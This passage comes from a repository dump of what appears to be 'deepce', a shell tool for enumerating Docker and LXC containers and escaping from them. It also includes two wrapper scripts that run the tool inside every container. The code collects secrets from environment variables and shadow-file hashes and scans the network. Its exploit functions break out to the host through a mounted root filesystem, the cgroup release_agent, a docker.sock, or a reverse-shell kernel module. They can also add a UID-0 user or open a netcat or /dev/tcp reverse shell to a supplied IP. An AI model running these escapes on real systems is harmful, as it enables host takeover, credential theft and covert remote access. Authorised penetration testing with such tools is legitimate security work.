\"$containerIP\" \"Could not find IP\"\n\n  # Container DNS\n  dnsServers=$(grep \"nameserver\" /etc/resolv.conf | cut -d' ' -f2 | tr '\\n' ' ')\n  printResult \"DNS Server(s) ...........\" \"$dnsServers\" \"Could not find DNS Servers\"\n\n  # Host IP\n  if [ -x \"$(command -v netstat)\" ]; then\n    hostIP=\"$(netstat -nr | grep '^0\\.0\\.0\\.0' | awk '{print $2}')\"\n  elif [ -x \"$(command -v ip)\" ]; then\n    hostIP=\"$(ip route get 1 | cut -d' ' -f 3)\"\n  elif [ \"$containerIP\" ]; then\n    # No tools available, just have a guess\n    hostIP=$(echo \"$containerIP\" | cut -d'.' -f 1-3).1\n  fi\n\n  printResult \"Host IP .................\" \"$hostIP\" \"Could not find Host IP\"\n}\n\ncontainerTools(){\n  for CMD in ${CONTAINER_CMDS}; do\n    tools=\"$tools $(command -v \"${CMD}\")\"\n  done\n  printResultLong \"Container tools .........\" \"$(echo \"$tools\" | tr ' ' '\\n'| grep -v '^$')\" \"None\"\n}\n\ncontainerName() {\n  # Get container name\n  # host, dig, nslookup\n\n  if [ \"$containerType\" = \"docker\" ]; then\n    # Requires containerIP\n    if [ \"$containerIP\" ]; then\n        if [ -x \"$(command -v host)\" ]; then\n          containerName=$(host \"$containerIP\" | rev | cut -d' ' -f1 | rev)\n        elif [ -x \"$(command -v dig)\" ]; then\n          containerName=$(dig -x \"$containerIP\" +noall +answer | grep 'PTR' | rev | cut -f1 | rev)\n        elif [ -x \"$(command -v nslookup)\" ]; then\n          containerName=$(nslookup \"$containerIP\" 2>/dev/null | grep 'name = ' | rev | cut -d' ' -f1 | rev)\n        else\n          missingTools=\"1\"\n        fi\n    fi\n  else\n    containerName=$containerID\n  fi\n\n  printQuestion \"Container Name ..........\"\n  if [ \"$containerName\" ]; then\n    printSuccess \"$containerName\"\n  else\n    printError \"Could not get container name through reverse DNS\"\n    if [ \"$missingTools\" ]; then\n      printTip \"$TIP_DNS_CONTAINER_NAME\"\n      printInstallAdvice \"host dig nslookup\"\n    fi\n  fi\n}\n\ngetContainerInformation() {\n  # Enumerate container info\n\n  if [ -x \"$(command -v lsb_release)\" ]; then\n    os=\"$(lsb_release -i | cut -f2)\"\n  else\n    os=\"$(uname -o)\"\n  fi\n\n  kernelVersion=$(uname -r)\n  arch=$(uname -m)\n  cpuModel=$(grep 'model name' /proc/cpuinfo | head -n1 | cut -d':' -f2| cut -d' ' -f2-)\n\n  printMsg \"Operating System ........\" \"$os\"\n  printMsg \"Kernel ..................\" \"$kernelVersion\"\n  printMsg \"Arch ....................\" \"$arch\"\n  printMsg \"CPU .....................\" \"$cpuModel\"\n\n  for CMD in ${USEFUL_CMDS}; do\n    tools=\"$tools $(command -v \"${CMD}\")\"\n  done\n\n  # shellcheck disable=SC2086 # Double quotes messes up output...\n  printResultLong \"Useful tools installed ..\" \"$(echo $tools | tr ' ' '\\n')\"\n}\n\ncontainerCapabilities() {\n  printQuestion \"Dangerous Capabilities ..\"\n  if [ -x \"$(command -v capsh)\" ]; then\n    if capsh --print| grep -q \"$DANGEROUS_CAPABILITIES\"; then\n        caps=$(capsh --print |grep 'cap_' | sed \"s/\\($DANGEROUS_CAPABILITIES\\)/${LG}${EX}&${NC}${DG}/g\")\n        printYes\n        printStatus \"$caps\"\n    else\n        printNo\n    fi\n  else\n    caps=$(grep Cap /proc/self/status)\n    capEff=$(grep CapEff /proc/self/status | cut -d ':' -f 2 | tr -d '\\t')\n    printError \"capsh not installed, listing raw capabilities\"\n    printInstallAdvice \"libcap2-bin\"\n    printStatus \"Current capabilities are:\"\n    printStatus \"$caps\"\n    printStatus \"> This can be decoded with: \\\"capsh --decode=${capEff}\\\"\"\n  fi\n}\n\ncontainerServices() {\n  # SSHD\n\n  printQuestion \"SSHD Service ............\"\n\n  if ! [ -x \"$(command -v ps)\" ]; then\n    printError \"Unknown (ps not installed)\"\n    return\n  fi\n\n  (ps -aux 2>/dev/null || ps -a) | grep -v \"grep\" | grep -q \"sshd\"\n\n  # shellcheck disable=SC2181\n  if [ $? -eq 0 ]; then\n    if [ -f \"/etc/ssh/sshd_config\" ]; then\n      sshPort=$(grep \"^Port\" /etc/ssh/sshd_config || echo \"Port 22\" | cut -d' ' -f2)\n      printSuccess \"Yes (port $sshPort)\"\n    else\n      printSuccess \"Yes\"\n    fi\n  else\n    printNo\n  fi\n}\n\ncontainerPrivileges() {\n  printQuestion \"Privileged Mode .........\"\n  if [ -x \"$(command -v fdisk)\" ]; then\n    if [ \"$(fdisk -l 2>/dev/null | wc -l)\" -gt 0 ]; then\n      printYesEx\n      printTip \"$TIP_PRIVILEGED_MODE\"\n    else\n      printNo\n    fi\n  else\n    printError \"Unknown\"\n  fi\n}\n\ncontainerExploits() {\n  # If we are on an alpine linux disto check for CVE–2019–5021\n  if [ -f \"/etc/alpine-release\" ]; then\n    alpineVersion=$(cat /etc/alpine-release)\n    printQuestion \"Alpine Linux Version ....\"\n    printSuccess \"$alpineVersion\"\n    printQuestion \"└── CVE-2019-5021 .......\"\n\n    if [ \"$(ver \"$alpineVersion\")\" -ge \"$(ver 3.3.0)\" ] && [ \"$(ver \"$alpineVersion\")\" -le \"$(ver 3.6.0)\" ]; then\n      printYesEx\n      printTip \"$TIP_CVE_2019_5021\"\n    else\n      printNo\n    fi\n  fi\n}\n\nenumerateContainers() {\n  printSection \"Enumerating Containers\"\n\n  if [ \"$inContainer\" ]; then # If inside a container\n\n    printTip \"$TIP_NETWORK_ENUM\"\n\n    # Find containers...\n    if [ \"$dockerCommand\" ]; then\n        # Enumerate containers using docker\n        dockercontainers=$(docker ps --format \"{{.Names}}\" 2>/dev/null | wc -l)\n        printMsg \"Docker Containers........\" \"$dockercontainers\"\n        docker ps -a\n    elif [ \"$dockerSockPath\" ]; then\n        # Enumerate containers using sock\n        TODO \"Enumerate container using sock\"\n    else\n        pingSweep\n    fi\n\n    portScan\n\n  else # Not in a container\n\n    if docker ps >/dev/null 2>&1; then # Enumerate docker containers\n        dockercontainers=$(docker ps --format \"{{.Names}}\" 2>/dev/null | wc -l)\n        dockercontainersTotal=$(docker ps -a --format \"{{.Names}}\" 2>/dev/null | wc -l)\n        printMsg \"Docker Containers........\" \"$dockercontainers Running, $dockercontainersTotal Total\"\n        docker ps -a\n    fi\n    if lxc list >/dev/null 2>&1; then # Enumerate lxc containers\n        lxccontainers=$(lxc list | grep -c \"| RUNNING |\" 2>/dev/null)\n        lxccontainersTotal=$(lxc list | grep -c \"| CONTAINER |\" 2>/dev/null)\n        printMsg \"LXC Containers...........\" \"$lxccontainers Running, $lxccontainersTotal Total\"\n        lxc list\n    fi\n    if rkt list >/dev/null 2>&1; then # Enumerate rkt containers\n        rktcontainers=$(rkt list 2>/dev/null | tail -n +2  | wc -l)\n        printMsg \"RKT Containers...........\" \"$rktcontainers Total\" # TODO: Test and add total\n        rkt list\n    fi\n  fi\n}\n\npingSweep() {\n  if [ \"$noNetwork\" ]; then\n    return\n  fi\n\n  if [ \"$containerIP\" ]; then\n    # Enumerate containers the hard way (network enumeration)\n    subnet=$(echo \"$containerIP\" | cut -d'.' -f1-3)\n\n    if [ -x \"$(command -v nmap)\" ]; then\n      # Method 1: nmap\n      printQuestion \"Attempting ping sweep of $subnet.0/24 (nmap)\"\n      nl\n      nmap -oG - -sP \"$subnet.0/24\" | grep \"Host:\"\n    elif [ -x \"$(command -v ping)\" ] && ping -c 1 127.0.0.1 2>/dev/null 1>&2; then\n      # Method 2: ping sweep (check ping is executable, and we can run it, sometimes needs root)\n      printQuestion \"Attempting ping sweep of $containerIP/24 (ping)\"\n      nl\n\n      pids=\"\"\n      # Ping all IPs in range\n      set +m\n      for addr in $(seq 1 1 10); do\n        (ping -c 1 -t 1 \"$subnet.$addr\" >/dev/null && echo \"$subnet.$addr\" is Up) & true >/dev/null\n        pids=\"${pids} $!\"\n      done\n\n      # Wait for all background pids to complete\n      for pid in ${pids}; do\n        wait \"${pid}\"\n      done\n    else\n      printError \"Could not ping sweep, requires nmap or ping to be executable\"\n    fi\n  else\n    printError \"Cannot enumerate network without IP address\"\n  fi\n}\n\nportScan() {\n  if [ \"$noNetwork\" ]; then\n    return\n  fi\n\n  # Scan containers / host\n  if [ -x \"$(command -v nmap)\" ]; then\n    # Method 1: nmap\n    if [ \"$containerIP\" ]; then\n      printSection \"Scanning Host\"\n      printQuestion \"Scanning host $hostIP (nmap)\"\n      nmap \"$hostIP\" -p-\n    fi\n  fi\n}\n\nfindMountedFolders() {\n  # Find information about mount points\n  printSection \"Enumerating Mounts\"\n\n  printQuestion \"Docker sock mounted .......\"\n  if grep -q docker.sock /proc/self/mountinfo; then\n    printYesEx\n    # Docker sock appears to be mounted, uhoh!\n    printTip \"$TIP_WRITABLE_SOCK\"\n    dockerSockPath=$(grep \"docker.sock\" /proc/self/mountinfo | cut -d' ' -f 5)\n  else\n    printNo\n  fi\n\n  otherMounts=$(grep -v \"$GREP_IGNORE_MOUNTS\" /proc/self/mountinfo | cut -d' ' -f 4-)\n\n  printQuestion \"Other mounts ..............\"\n  if [ \"$otherMounts\" ]; then\n    printYes\n    printStatus \"$otherMounts\"\n\n    # Possible host usernames found: (sed is hard... using a fudge)\n    usernames=$(echo \"$otherMounts\" | sed 's/.*\\/home\\/\\(.*\\)/\\1/' | cut -d '/' -f 1 | sort | uniq | tr '\\n' ' ')\n    if [ \"$usernames\" ]; then\n      printResult \"Possible host usernames ...\" \"$usernames\"\n    fi\n\n    if echo \"$otherMounts\" | grep -q \"ecryptfs\"; then\n      printResult \"Encrypted home directory ..\" \"Detected\"\n    fi\n\n  else\n    printNo\n  fi\n}\n\nfindInterestingFiles() {\n  printSection \"Interesting Files\"\n\n  interestingVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Ii \"$GREP_SECRETS\")\n  boringVars=$( (env && cat /proc/*/environ) 2>/dev/null | sort | uniq | grep -Iiv \"$GREP_SECRETS\")\n\n  printQuestion \"Interesting environment variables ...\"\n  if [ \"$interestingVars\" ]; then\n    printYes\n    printSuccess \"$interestingVars\"\n  else\n    printNo\n  fi\n\n  printStatus \"$boringVars\"\n\n  # Any common entrypoint files etc?\n  entrypoint=$(ls -lah /*.sh /*entrypoint* /**/entrypoint* /**/*.sh /deploy* 2>/dev/null)\n  printResultLong \"Any common entrypoint files .........\" \"$entrypoint\"\n\n  # Any files in root dir\n  if [ -x \"$(command -v find)\" ]; then\n    interestingFiles=$(find / -maxdepth 1 -type f | grep -v \"/.dockerenv\\|deepce.sh\")\n  else\n    # shellcheck disable=SC2010\n    interestingFiles=$(ls -lah / | grep -v '^d\\|^l\\|^total\\|.dockerenv\\|deepce.sh')\n  fi\n\n  printResultLong \"Interesting files in root ...........\" \"$interestingFiles\"\n\n  # Any secrets in root dir files\n  result=$(grep -Iins --exclude=\"deepce.sh\" \"$GREP_SECRETS\" /*)\n\n  printResultLong \"Passwords in common files ...........\" \"$result\"\n\n  # Home Directories\n  homeDirs=\"$(ls -lAh /home)\"\n  printQuestion \"Home directories ....................\"\n\n  if echo \"$homeDirs\" | grep -qv 'total 0'; then\n    printStatus \"$homeDirs\"\n  else\n    printNo\n  fi\n\n  printQuestion \"Hashes in shadow file ...............\"\n  if test -r /etc/shadow; then\n    hashes=$(cut -d':' -f2 < /etc/shadow 2>/dev/null | grep -v '^*$\\|^!')\n    if [ \"$hashes\" ]; then\n      printYes\n      printStatus \"$hashes\"\n    else\n      printNo\n    fi\n  else\n    printFail \"Not readable\"\n  fi\n\n  # TODO: Check this file /run/secrets/\n\n  printQuestion \"Searching for app dirs ..............\"\n  nl\n  for p in ${PATH_APPS}; do\n    if [ -f \"$p\" ]; then\n      printSuccess \"$p\"\n      printMsg \"$(ls -lAh \"$p\")\"\n    fi\n  done\n}\n\ncheckDockerRootless() {\n  printQuestion \"Rootless ................\"\n  if docker info 2>/dev/null|grep -q rootless; then\n    printYes\n    printTip \"$TIP_DOCKER_ROOTLESS\"\n  else\n    printNo\n  fi\n}\n\ngetDockerVersion() {\n  printQuestion \"Docker Executable .......\"\n  if [ \"$(command -v docker)\" ]; then\n    dockerCommand=\"$(command -v docker)\"\n    dockerVersion=\"$(docker -v | cut -d',' -f1 | cut -d' ' -f3)\"\n\n    printSuccess \"$dockerCommand\"\n    printQuestion \"Docker version ..........\"\n    printSuccess \"$dockerVersion\"\n\n    checkDockerRootless\n\n    printQuestion \"User in Docker group ....\"\n    if groups | grep -q '\\bdocker\\b'; then\n      printYesEx\n      printTip \"$TIP_DOCKER_GROUP\"\n    else\n      printNo\n    fi\n  else\n    printFail \"Not Found\"\n  fi\n}\n\ncheckDockerVersionExploits() {\n  # Check version for known exploits\n  printResult \"Docker Version ..........\" \"$dockerVersion\" \"Version Unknown\"\n  if ! [ \"$dockerVersion\" ]; then\n    return\n  fi\n\n  printQuestion \"CVE–2019–13139 ..........\"\n  if [ \"$(ver \"$dockerVersion\")\" -lt \"$(ver 18.9.5)\" ]; then\n    printYesEx\n    printTip \"$TIP_CVE_2019_13139\"\n  else\n    printNo\n  fi\n\n  printQuestion \"CVE–2019–5736 ...........\"\n  if [ \"$(ver \"$dockerVersion\")\" -lt \"$(ver 18.9.3)\" ]; then\n    printYesEx\n    printTip \"$TIP_CVE_2019_5736\"\n  else\n    printNo\n  fi\n}\n\n###########################################\n#--------------) Exploits (---------------#\n###########################################\n\nprepareExploit() {\n  # Shared method that takes the user input and converts it into a cmd to be used for exploitation\n  # Current available PAYLOADS are:\n  # - shadow\n  # - local shell\n  # - custom command\n  # - new root user\n\n  printMsg \"Preparing Exploit\" \" \"\n\n  if [ \"$shadow\" ]; then\n\n    # Show shadow password hashes\n    printMsg \"Exploit Type .............\" \"Print Shadow\"\n    printMsg \"Clean up .................\" \"Automatic on container exit\"\n\n    cmd=\"cat /etc/shadow\"\n\n  elif [ \"$username\" ]; then\n    # New root user\n\n    if ! [ \"$username\" ]; then\n      printError \"username missing\"\n      exit 1\n    fi\n\n    if ! [ \"$password\" ]; then\n      printError \"password missing\"\n      exit 1\n    fi\n\n    printMsg \"Exploit Type .............\" \"Add new root user\"\n    printMsg \"Username .................\" \"$username\"\n    printMsg \"Password .................\" \"$password\"\n    printMsg \"Clean up .................\" \"Manual, remember to delete user after exploitation!\"\n    # Cool little bash one-liner to make a new user, set password and give it user id of 0 (root)\n    cmd=\"useradd $username;echo $password:$password|chpasswd $username;usermod -ou 0 $username\"\n\n  elif [ \"$command\" ]; then\n\n    # Custom payload (run a command)\n    printMsg \"Exploit Type .............\" \"Custom Command\"\n    printMsg \"Custom Command ...........\" \"$command\"\n    printMsg \"Clean up .................\" \"Automatic on container exit\"\n    cmd=\"$command\"\n\n  elif [ \"$ip\" ]; then\n    # Reverse shell\n\n    if ! [ \"$port\" ]; then\n      printError \"port missing\"\n      exit 1\n    fi\n\n    printMsg \"Shell Type ....... \" \"Reverse TCP\"\n    printMsg \"Create listener .. \" \"No\"\n    printMsg \"Host ............. \" \"$ip\"\n    printMsg \"Port ............. \" \"$port\"\n    cmd=\"/bin/sh -c nc $ip $port -e /bin/sh\"\n\n    if [ \"$listen\" ]; then\n      # Enable job control\n      set -m\n      # Create listener\n      nc -lvnp \"$port\" &\n      # PID_NC=$!\n      bg\n    fi\n\n  else\n    # TODO: Disable on sock / privileged as we dont have interactive\n    printMsg \"Exploit Type .............\" \"Local Shell\"\n    printMsg \"Create shell .............\" \"Yes\"\n    printMsg \"Clean up .................\" \"Automatic on container exit\"\n    cmd=\"/bin/sh\"\n  fi\n\n  if ! [ \"$cmd\" ]; then\n    printError \"Nothing to do, if trying to launch a shell add -cmd bash\"\n    exit 1\n  fi\n}\n\nexploitDocker() {\n  printSection \"Exploiting Docker\"\n  printTip \"$TIP_DOCKER_CMD\"\n\n  if ! [ -x \"$(command -v docker)\" ]; then\n    printError \"Docker command not found, but required for this exploit\"\n    exit\n  fi\n\n  checkDockerRootless\n\n  prepareExploit\n  printQuestion \"Exploiting\"\n  nl\n  # shellcheck disable=SC2086 # Word splitting is expected and allowed here\n  docker run -v /:/mnt --rm -it alpine chroot /mnt $cmd\n\n  printQuestion \"Exploit complete ....\"\n  if [ $? ]; then\n    printSuccess \"Success\"\n  else\n    printError 'Error'\n  fi\n}\n\nexploitPrivileged() {\n\n# This is disabled because if no-enum is set then we dont know if we're in a container..\n#  if ! [ \"$inContainer\" ]; then\n#    printError \"Not in container\"\n#    return\n#  fi\n\n  printSection \"Exploiting Privileged\"\n  printTip \"$TIP_PRIVILEGED_MODE\"\n  prepareExploit\n\n  # POC modified from https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/\n  # shellcheck disable=SC2012 # Not using find as it may not be available\n  d=$(dirname \"$(ls -x /s*/fs/c*/*/r* | head -n1)\")\n  if [ -S \"$d\" ]; then\n    printError \"Error: exploit failed (docker too old?)\"\n    return\n  fi\n  mkdir -p \"$d/w\"\n  echo 1 >\"$d/w/notify_on_release\"\n  t=\"$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /etc/mtab)\"\n  touch /o\n  echo \"$t/c\" >\"$d/release_agent\"\n  printf \"#!/bin/sh\\n%s > %s/o\" \"$cmd\" \"$t\">/c\n  chmod +x /c\n  sh -c \"echo 0 >$d/w/cgroup.procs\"\n  sleep 1\n  cat /o\n  rm /c /o\n}\n\nexploitDockerSock() {\n  printSection \"Exploiting Sock\"\n  printTip \"$TIP_DOCKER_SOCK\"\n\n  if ! [ -x \"$(command -v curl)\" ]; then\n    printInstallAdvice \"curl\"\n    exit\n  fi\n\n  if ! [ -S \"$dockerSockPath\" ]; then\n    printError \"Docker sock not found, but required for this exploit\"\n    exit\n  fi\n\n  prepareExploit\n\n  nl\n\n  # Try to find an available docker image\n  json_data=$(curl -s --unix-socket /var/run/docker.sock http://localhost/images/json)\n  docker_img=$(echo \"$json_data\" | grep -o '\"RepoTags\":\\[\"[^\"]*' | grep -o '[^\"]*$' | tail -1)\n\n  if [ -z \"$docker_img\" ]; then\n    printInfo 'No avaliable docker image found, using alpine'\n    docker_img=\"alpine\" \n  fi \n\n  # Create docker container using the docker sock\n  payload=\"[\\\"/bin/sh\\\",\\\"-c\\\",\\\"chroot /mnt sh -c \\\\\\\"$cmd\\\\\\\"\\\"]\"\n  response=$(curl -s -XPOST --unix-socket /var/run/docker.sock -d \"{\\\"Image\\\":\\\"$docker_img\\\",\\\"cmd\\\":$payload, \\\"Binds\\\": [\\\"/:/mnt:rw\\\"]}\" -H 'Content-Type: application/json' http://localhost/containers/create)\n\n  if ! [ $? ]; then\n    printError 'Something went wrong'\n    echo \"$response\"\n    return\n  fi\n\n  revShellContainerID=$(echo \"$response\" | cut -d'\"' -f4)\n  printQuestion \"Creating container .....\"\n  printSuccess \"$revShellContainerID\"\n\n  startCmd=\"curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/start\"\n  logsCmd=\"curl -s --unix-socket /var/run/docker.sock \\\"http://localhost/containers/$revShellContainerID/logs?stderr=1&stdout=1\\\" --output -\"\n  deleteCmd=\"curl -s -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID/stop\"\n  removeCmd=\"curl -s -XDELETE --unix-socket /var/run/docker.sock http://localhost/containers/$revShellContainerID\"\n\n  printQuestion \"If the shell dies you can restart your listener and run the start command to fire it again\"\n  nl\n  printStatus \"Start Command: $startCmd\"\n  printStatus \"Logs Command: $logsCmd\"\n\n  printQuestion \"Once complete remember to tidy up by stopping and removing your container with following commands\"\n  nl\n\n  printStatus \"Stop Command: $deleteCmd\"\n  printStatus \"Remove Command: $removeCmd\"\n\n  # FIXME: Must be a better way of doing this...\n  response=$(eval \"$startCmd\")\n\n  printQuestion \"Starting container .....\"\n  if [ $? ]; then\n    printSuccess \"Success\"\n  else\n    printError 'Something went wrong...'\n  fi\n\n  delay=2\n\n  printMsg \"Sleeping for ...........\" \"${delay}s\"\n\n  sleep $delay\n\n  response=$(eval \"$logsCmd\")\n\n  printQuestion \"Fetching logs ..........\"\n  if [ $? ]; then\n    printSuccess \"Success\"\n    printStatus \"$response\"\n  else\n    printError 'Something went wrong...'\n  fi\n\n  printQuestion \"Exploit completed .....\"\n  if [ \"$listen\" ]; then\n    # Create listener\n    printSuccess 'Switching to listener'\n    fg\n  else\n    printSuccess ':)'\n  fi\n\n  # TODO: Switch to listener if wanted\n  # TODO: Tidy up command\n}\n\nexploitSysModule(){\n  printSection \"Exploiting SYS_MODULE\"\n  printTip \"$TIP_SYS_MODULE\"\n\n  if ! [ -x \"$(command -v capsh)\" ]; then\n    printError \"capsh is required to run this exploit.\"\n    exit 1\n  fi\n\n  if ! [ -x \"$(command -v make)\" ]; then\n    printError \"make is required to run this exploit.\"\n    exit 1\n  fi\n\n  if ! [ -x \"$(command -v insmod)\" ]; then\n    printError \"insmod is required to run this exploit.\"\n    exit 1\n  fi\n\n  if ! [ -d \"/lib/modules/$(uname -r)\" ]; then\n    printError \"Linux headers for $(uname -r) are required to run this exploit.\"\n    exit 1\n  fi\n\n  caps=$(capsh --print)\n  if ! echo \"$caps\" | grep -qa \"cap_sys_module\" ; then\n    printError \"We don't have the SYS_MODULE capability, which is required for this exploit\"\n    exit 1\n  fi\n\n  if [ -z \"$ip\" ]; then\n    printError \"Missing reverse shell IP : use --ip\"\n    exit 1\n  fi\n\n  if [ -z \"$port\" ]; then\n    printError \"Missing reverse shell port : use --port\"\n    exit 1\n  fi\n  \n  module_name=$(tr -dc A-Za-z </dev/urandom | head -c 13)\n  sys_cwd=$(pwd)\n\n  mkdir /dev/shm/rev && cd /dev/shm/rev || exit 1\n\n  printQuestion \"Writing scripts...\"\n\n  # POC modified from https://blog.pentesteracademy.com/abusing-sys-module-capability-to-perform-docker-container-breakout-cf5c29956edd\ncat << EOF > \"$module_name.c\"\n#include <linux/kmod.h>\n#include <linux/module.h>\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"AttackDefense\");\nMODULE_DESCRIPTION(\"LKM reverse shell module\");\nMODULE_VERSION(\"1.0\");\nchar* argv[] = {\"/bin/bash\",\"-c\",\"bash -i >& /dev/tcp/$ip/$port 0>&1\", NULL};\nstatic char* envp[] = {\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\", NULL };\nstatic int __init ${module_name}_init(void) {\nreturn call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);\n}\nstatic void __exit ${module_name}_exit(void) {\n}\nmodule_init(${module_name}_init);\nmodule_exit(${module_name}_exit);\nEOF\n\ncat << EOF > Makefile\nobj-m +=${module_name}.o\nall:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) modules\nclean:\n\tmake -C /lib/modules/$(uname -r)/build M=$(pwd) clean\nEOF\n\n  printSuccess \"Done\"\n\n  printQuestion \"Compiling kernel module...\"\n\n  if make 1>/dev/null ; then\n    printSuccess \"Done\"\n  else\n    printError \"Failed to make. Do you have all the required libraries installed?\"\n    exit 1\n  fi\n\n  printQuestion \"Mounting kernel module...\"\n\n  if insmod \"$module_name.ko\" 1>/dev/null ; then\n    printSuccess \"Done\"\n  else\n    printError \"Failed to mount module\"\n    exit 1\n  fi\n\n  printQuestion \"Cleaning up...\"\n\n  rm -r /dev/shm/rev\n\n  cd \"$sys_cwd\" || exit\n\n  printSuccess \"Done\"\n\n  printSuccess \"Check your reverse shell handler!\"\n\n}\n\n###########################################\n#--------------) Arg Parse (--------------#\n###########################################\n\nwhile [ $# -gt 0 ]; do\n  key=\"$1\"\n  case $key in\n  -h | --help)\n    show_help\n    exit 0\n    ;;\n  -ne | --no-enumeration | --no-enum | --no-enumerate)\n    skipEnum=\"1\"\n    shift\n    ;;\n  -nn | --no-network | --no-net)\n    noNetwork=\"1\"\n    shift\n    ;;\n  -nc | --no-cols | --no-colors | --no-colours)\n    unsetColors\n    shift\n    ;;\n  -q | --quiet)\n    quiet=\"1\"\n    shift\n    ;;\n  -e | -ex | --exploit)\n    exploit=\"$2\"\n    shift\n    shift\n    ;;\n  -l | --listen)\n    listen=\"1\"\n    shift\n    ;;\n  --user|--username)\n    username=\"$2\"\n    shift\n    shift\n    ;;\n  -cmd | --command)\n    command=\"$2\"\n    shift\n    shift\n    ;;\n  --pass|--password)\n    password=\"$2\"\n    shift\n    shift\n    ;;\n  -s | --shadow)\n    shadow=\"1\"\n    shift\n    ;;\n  -i | --ip)\n    ip=\"$2\"\n    shift\n    shift\n    ;;\n  -p | --port)\n    port=\"$2\"\n    shift\n    shift\n    ;;\n  --install)\n    install=\"1\"\n    shift\n    ;;\n  -doc | --delete | --delete-on-complete)\n    delete=\"1\"\n    shift\n    ;;\n  *)\n    echo \"Unknown option $1\"\n    exit 1\n    ;;\n  esac\ndone\n\n###########################################\n#--------------) Execution (--------------#\n###########################################\n\nbanner\ndescribeColors\ninstallPackages\n\nif ! [ \"$skipEnum\" ]; then\n\n  printSection \"Enumerating Platform\"\n  containerCheck\n\n  printQuestion \"Inside Container ........\"\n\n  if [ \"$inContainer\" ]; then\n    # Inside Container\n    printYes\n    containerType\n    containerTools\n    userCheck\n    if [ \"$containerType\" = \"docker\" ]; then\n      getDockerVersion\n      dockerSockCheck\n      checkDockerVersionExploits\n    fi\n    enumerateContainer\n    findMountedFolders\n    findInterestingFiles\n    enumerateContainers\n  else\n    # Outside Container\n    printNo\n    userCheck\n    containerTools\n    getDockerVersion\n    dockerSockCheck\n    checkDockerVersionExploits\n    enumerateContainers\n  fi\nfi\n\n# Parse exploit argument\nif [ \"$exploit\" ]; then\n  case $exploit in\n  docker | DOCKER)\n    exploitDocker\n    ;;\n  priv | PRIV | privileged | PRIVILEGED)\n    exploitPrivileged\n    ;;\n  sock | SOCK)\n    exploitDockerSock\n    ;;\n  sys | SYS | sys_module | SYS_MODULE)\n    exploitSysModule\n    ;;\n  *)\n    echo \"Unknown exploit $1\"\n    exit 1\n    ;;\n  esac\nfi\n\nprintSection \"\"\n\n\nif [ \"$delete\" ]; then\n  rm -- \"$0\"\nfi\n\nexit 0\n"
        },
        {
          "name": "docker-wrapper.sh",
          "type": "blob",
          "size": 1.021484375,
          "content": "#!/bin/sh\n# This script will run deepce on every active docker container it finds\n\n# Get the path to this script so we can find the deepce.sh script\nSCRIPT=$(realpath \"$0\")\nSCRIPTPATH=$(dirname \"$SCRIPT\")\n\n# Check if docker is accessible\nif [ \"$(command -v docker)\" ]; then\n    echo \"Docker is accessible\"\nelse\n    echo \"Error: Docker is not accessible\"\n    exit\nfi\n\n# Check if current user is root or in the docker group \nif groups | grep -q '\\bdocker\\b'; then\n    echo \"User is in docker group\"\nelse\n    if [ \"$(id -u)\" = 0 ]; then\n        echo \"User is root\"\n    else\n        echo \"Error: current user is not in docker group and is not root\"\n        exit\n    fi\nfi\n\ncontainers=$(docker ps --format \"{{.Names}}\")\nfor container in $containers\ndo\n    echo \"Running deepce on docker container: $container\"\n    docker exec \"$container\" mkdir -p /deepce\n    docker cp \"$SCRIPTPATH/deepce.sh\" \"$container:/deepce/\"\n    docker exec \"$container\" /deepce/deepce.sh --delete | tee \"docker-$container.log\"\n    docker exec \"$container\" rm -rf /deepce\ndone\n"
        },
        {
          "name": "docs",
          "type": "tree",
          "content": null
        },
        {
          "name": "guides",
          "type": "tree",
          "content": null
        },
        {
          "name": "lxc-wrapper.sh",
          "type": "blob",
          "size": 0.9853515625,
          "content": "#!/bin/sh\n# This script will run deepce on every active lxc container it finds\n\n# Get the path to this script so we can find the deepce.sh script\nSCRIPT=$(realpath \"$0\")\nSCRIPTPATH=$(dirname \"$SCRIPT\")\n\n# Check if lxc is accessible\nif [ \"$(command -v lxc)\" ]; then\n    echo \"LXC is accessible\"\nelse\n    echo \"Error: LXC is not accessible\"\n    exit\nfi\n\n# Check if current user is root or in the lxc group\nif groups | grep -q '\\blxd\\b'; then\n    echo \"User is in lxd group\"\nelse\n    if [ \"$(id -u)\" = 0 ]; then\n        echo \"User is root\"\n    else\n        echo \"Error: current user is not in lxd group and is not root\"\n        exit\n    fi\nfi\n\ncontainers=$(lxc list -c n --format csv)\nfor container in $containers\ndo\n    echo \"Running deepce on lxc container: $container\"\n    lxc exec \"$container\" -- mkdir -p /deepce\n    lxc file push \"$SCRIPTPATH/deepce.sh\" \"$container/deepce/\"\n    lxc exec \"$container\" \"/deepce/deepce.sh\" --delete | tee \"lxc-$container.log\"\n    lxc exec \"$container\" -- rm -rf /deepce\ndone\n"
        },
        {
          "name": "tests",
          "type": "tree",
          "content": null
        }
      ]
    }
  ]
}